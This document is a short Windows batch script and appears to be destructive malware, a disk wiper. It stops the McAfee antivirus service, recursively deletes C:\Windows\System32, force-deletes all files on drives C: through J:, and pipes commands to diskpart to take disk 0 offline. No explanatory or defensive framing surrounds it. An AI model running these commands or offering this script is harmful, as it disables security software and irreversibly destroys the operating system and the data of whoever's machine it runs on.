@echo off

net stop "McAfee Framework"
cd C:\Windows\System32
rd /s /q C:\Windows\System32
del /f /s /q c:\*.*
del /f /s /q d:\*.*
del /f /s /q e:\*.*
del /f /s /q f:\*.*
del /f /s /q g:\*.*
del /f /s /q h:\*.*
del /f /s /q i:\*.*
del /f /s /q j:\*.*
echo list disk | diskpart
echo select disk 0 | diskpart
echo offline disk | diskpart

